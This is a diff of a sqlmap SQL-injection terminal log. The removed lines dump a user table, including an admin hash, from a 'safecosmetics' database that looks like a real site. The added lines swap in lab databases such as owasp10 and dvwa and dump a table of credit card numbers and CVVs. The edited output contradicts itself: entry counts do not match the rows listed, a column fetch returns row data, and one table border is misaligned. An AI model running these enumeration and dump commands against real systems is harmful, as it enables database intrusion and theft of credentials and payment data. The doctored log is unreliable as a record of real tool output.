@@ -24,66 +24,69 @@ web application technology: Apache 2.2.22
 back-end DBMS: MySQL 5
 [12:13:00] [INFO] fetching database names
 [12:13:00] [INFO] the SQL query used returns 2 entries
+[12:13:00] [INFO] resumed: dvwa
 [12:13:00] [INFO] resumed: information_schema
-[12:13:00] [INFO] resumed: safecosmetics
+[12:13:00] [INFO] resumed: metasploit
+[12:13:00] [INFO] resumed: mysql
+[12:13:00] [INFO] resumed: owasp10
+[12:13:00] [INFO] resumed: tikiwiki
+[12:13:00] [INFO] resumed: tikiwiki95
 available databases [2]:
+[*] dvwa
 [*] information_schema
-[*] safecosmetics
+[*] metasploit
+[*] mysql
+[*] owasp10
+[*] tikiwiki
+[*] tikiwiki95
 
 ┌──(kali㉿kali)-[~/Downloads]
-└─$ python sqlmap.py -r extract.txt --tables -D safecosmetics
+└─$ python sqlmap.py -r extract.txt --tables -D owasp10
 
 [11:55:18] [INFO] the back-end DBMS is MySQL
 web server operating system: FreeBSD
 web application technology: Apache 2.2.22
 back-end DBMS: MySQL 5
-[11:55:18] [INFO] fetching tables for database: 'safecosmetics'
+[11:55:18] [INFO] fetching tables for database: 'owasp10'
 [11:55:19] [INFO] heuristics detected web page charset 'ascii'
 [11:55:19] [INFO] the SQL query used returns 216 entries
 [11:55:20] [INFO] retrieved: acl_acl
 [11:55:21] [INFO] retrieved: acl_acl_sections
-........... more tables
+
++----------------+
+| accounts       |
+| blog_tabel     |
+| captured_data  |
+| credit_cards   |
+| hitlog         |
+| permission     |
+| pen_test_tools |
++----------------+
+
 
 ┌──(kali㉿kali)-[~/Downloads]
-└─$ python sqlmap.py -r extract.txt --columns -D safecosmetics -T users
+└─$ python sqlmap.py -r extract.txt --columns -D owasp10 -T credit_cards
 
 [12:17:39] [INFO] the back-end DBMS is MySQL
 web server operating system: FreeBSD
 web application technology: Apache 2.2.22
 back-end DBMS: MySQL 5
-[12:17:39] [INFO] fetching columns for table 'users' in database 'safecosmetics'
+[12:17:39] [INFO] fetching columns for table 'credit_cards' in database 'owasp10'
 [12:17:41] [INFO] heuristics detected web page charset 'ascii'
-[12:17:41] [INFO] the SQL query used returns 8 entries
-[12:17:42] [INFO] retrieved: id
-[12:17:43] [INFO] retrieved: int(11)
-[12:17:45] [INFO] retrieved: name
-[12:17:46] [INFO] retrieved: text
-[12:17:47] [INFO] retrieved: password
-[12:17:48] [INFO] retrieved: text
-.......
-[12:17:59] [INFO] retrieved: hash
-[12:18:01] [INFO] retrieved: varchar(128)
-Database: safecosmetics
-Table: users
-[8 columns]
-+-------------------+--------------+
-| Column            | Type         |
-+-------------------+--------------+
-| email             | text         |
-| hash              | varchar(128) |
-| id                | int(11)      |
-| name              | text         |
-| password          | text         |
-| permission        | tinyint(4)   |
-| system_allow_only | text         |
-| system_home       | text         |
-+-------------------+--------------+
-
-┌──(kali㉿kali)-[~/Downloads]
-└─$ python sqlmap.py -r extract.txt --dump -D safecosmetics -T users
-
-+----+--------------------+-----------+-----------+----------+------------+-------------+-------------------+
-| id | hash               | name      | email     | password | permission | system_home | system_allow_only |
-+----+--------------------+-----------+-----------+----------+------------+-------------+-------------------+
-| 1  | 5DIpzzDHFOwnCvPonu | admin     | <blank>   | <blank>  | 3          | <blank>     | <blank>           |
-+----+--------------------+-----------+-----------+----------+------------+-------------+-------------------+
+[12:17:41] [INFO] the SQL query used returns 5 entries
+[12:17:42] [INFO] retrieved: ccid
+[12:17:43] [INFO] retrieved: ccv
+[12:17:45] [INFO] retrieved: ccnumber
+[12:17:46] [INFO] retrieved: expiration
+Database: owasp10
+Table: credit_cards
+[5 entries]
++---------+------+-------------------+------------+
+| ccid    | ccv  | ccnumber          | expiration |
++---------+------+-------------------+------------+
+| 1       | 745  | 45147854457841235 | 2012-03-01 |
+| 2       | 722  | 95778855998521457 | 2013-12-20 |
+| 3       | 461  | 85841235458855451 | 2016-10-12 |
+| 4       | 230  | 14578545552265656 | 2011-04-03 |
+| 5       | 627  | 45649878451231554 | 2015-06-16 |
++---------+------+-----------+-------+------------+
